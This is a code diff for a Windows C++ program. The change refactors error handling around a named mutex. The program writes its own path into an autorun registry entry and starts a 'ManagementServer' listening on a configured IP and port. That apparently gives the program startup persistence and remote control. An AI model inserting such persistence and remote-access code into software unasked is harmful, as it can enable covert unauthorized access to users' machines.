@@ -43,6 +43,7 @@ int showMessageBox(const std::string& title, const std::string& body) {
 */
 int main(int argc, char** argv) {
     HANDLE programMutex;
+    int retValue = ERROR;
     try {
         programMutex = CreateMutexA(NULL, FALSE, SHARED_MUTEX_NAME.c_str());
 
@@ -55,17 +56,24 @@ int main(int argc, char** argv) {
                                       std::to_string(GetLastError())).c_str());
             }
         }
+
+        WaitForSingleObject(programMutex, INFINITE);
+        addRegEntryIfNotExists(AUTORUN_REG_PATH, AUTORUN_ENTRY_NAME, argv[0]);
+
+        ManagementServer server = ManagementServer(DEFAULT_MANAGER_SERVER_IP, DEFAULT_MANAGER_SERVER_PORT);
+        server.start();
+        Sleep(SLEEPING_DURATION);
+        retValue = SUCCESS;
+
     } catch (std::exception& exception) {
         std::cout << exception.what() << std::endl;
+        retValue = ERROR;
     }
-    WaitForSingleObject(programMutex, INFINITE);
-    addRegEntryIfNotExists(AUTORUN_REG_PATH, AUTORUN_ENTRY_NAME, argv[0]);
-
-    //int messageBoxCode = showMessageBox(MESSAGE_BOX_TITLE, MESSAGE_BOX_BODY);
-    ManagementServer server = ManagementServer("0.0.0.0", 33333);
-    server.start();
-    Sleep(SLEEPING_DURATION);
-    ReleaseMutex(programMutex);
-
-    return SUCCESS;
+    
+    if (programMutex != NULL)
+    {
+        ReleaseMutex(programMutex);
+        CloseHandle(programMutex);
+    }
+    return retValue;
 }
